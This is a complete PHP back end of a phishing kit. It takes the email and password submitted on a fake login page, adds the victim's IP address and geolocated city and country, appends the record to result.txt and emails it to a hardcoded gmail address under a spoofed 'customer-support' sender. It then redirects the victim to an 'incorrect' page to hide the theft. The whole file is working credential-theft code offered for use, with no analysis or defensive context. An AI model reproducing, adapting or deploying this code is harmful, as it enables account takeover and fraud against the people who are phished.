<?php
if($_POST["userid"] != "" and $_POST["pass"] != ""){
require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 
$adddate=date("D M d, Y g:i a");
$message .= "--------------0nline Inf0-----------------------\n";
$message .= "Email            : ".$_POST['userid']."\n";
$message .= "Password           : ".$_POST['pass']."\n";
$message .= "---------=IP Address & Date=---------\n";
$message .= "IP Address: ".$ip."\n";
$message .= "City: {$geoplugin->city}\n";
$message .= "Region: {$geoplugin->region}\n";
$message .= "Country Name: {$geoplugin->countryName}\n";
$message .= "Country Code: {$geoplugin->countryCode}\n";
$message .= "Date: ".$adddate."\n";
$message .= "---------------Unknown-------------\n";
//change ur email here
$send = "ivamko333@gmail.com";
$subject = "$geoplugin->countryName .$ip.";
$file = fopen("result.txt", "a");
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
fputs ($file, "$message\r\n");
fputs ($file, "--------\r\n");
fclose ($file);
$headers = "From: 0ffice<customer-support@eresultz.org>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}
$praga=rand();
$praga=md5($praga);
     header("Location: incorrect.php?user=".$_POST['userid']);
}else{
header("Location: index.php");
}

?>
